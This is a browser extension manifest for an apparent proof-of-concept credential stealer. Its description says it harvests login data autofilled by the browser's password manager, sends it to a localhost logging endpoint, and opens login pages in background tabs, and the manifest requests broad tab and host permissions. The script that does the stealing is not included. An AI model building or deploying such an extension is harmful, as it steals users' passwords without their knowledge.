{
    "manifest_version": 2,

    "name": "StealCredentialsFromPasswordManager",
    "description": "Extension that steals the data from an login form if the browser's password manager has filled in the credentials. Sends data to http://localhost:3000/log without the need for any host permissions. Also explicitly opens login web pages in background tabs." ,
    "version": "1.0",

	"background": {
		"scripts": ["background.js"]
	},
	
	"permissions": [
		"tabs",
		"https://*/*",
		"http://*/*"
	]
}
